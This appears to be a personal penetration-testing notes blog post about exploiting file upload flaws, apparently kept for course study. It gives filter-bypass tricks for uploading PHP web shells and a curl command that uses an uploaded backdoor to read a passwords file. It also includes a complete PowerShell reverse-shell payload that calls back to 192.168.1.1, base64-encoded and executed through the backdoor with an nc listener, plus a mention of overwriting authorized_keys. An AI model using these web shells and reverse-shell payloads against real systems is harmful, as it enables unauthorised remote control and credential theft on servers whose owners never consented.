---
layout: post
title: File Upload
titledate: 08/30/23
tags: ["infosec","offsec", "web", "exploit", "php", "http"]
---

<h4>executable files</h4>

can we upload txt files instead of images?

how about a web shell

/usr/share/webshells

can try phps and php7 extensions or rand case pHP if upload is blocked

<h3>NOTE: when trying to upload shells.. use dir or pwd to get cwd to know where you are</h3>

    $ curl "http://vulnapp.com/home/uploads/simple-backdoor.pHp?cmd=type%20..\..\..\passwords.txt" 

how about a powershell reverse shell 

    $ pwsh

```powershell
PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.1.1",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```
```powershell
PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
```
```powershell
PS> $EncodedText =[Convert]::ToBase64String($Bytes)
```
```powershell
PS> $EncodedText
```
    $ nc -nlvp 443

    $ curl http://192.168.1.200/home/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20BASE64

<h4>non-executable files</h4>

what if we can upload a file but there is no php or asp, and we can't execute the file?

one example of this non executable file upload vulnerabilitiy is overwriting a file like authorized_keys

in burp

![_config.yml]({{ site.baseurl }}/images/web/file_upload.png)

